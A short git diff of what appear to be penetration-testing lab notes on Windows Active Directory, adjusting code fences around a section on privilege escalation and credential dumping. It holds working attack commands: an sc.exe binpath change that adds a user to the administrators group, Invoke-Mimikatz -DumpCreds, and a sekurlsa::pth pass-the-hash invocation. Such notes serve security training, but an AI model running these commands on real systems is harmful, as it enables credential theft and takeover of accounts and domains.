@@ -215,14 +215,14 @@ group with sc.exe config "Service Name" binpath="net localgroup administrators c
 ```bash
 
 **Invoke-AllChecks -Verbose**  script runs several security checks, which might include things like finding clear-text passwords in memory, identifying weak or insecure configurations, testing for privilege escalation paths, and more.
-
+```
 ## Credential Dumping
 
+```bash
 Download and run **Invoke-Mimikatz.ps1** in cmd to load scripts.
 
 **Invoke-Mimikatz -DumpCreds -Verbose -** Dumps all credentials of domain and local users on the system. But you need admin privilege before you can run this commands./code
 
-```bash
 **Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:cyberwarfare.corp/hash: 
 /run:powershell.exe" - Used the hash of the admin user to execute the powershell command.**
 ```
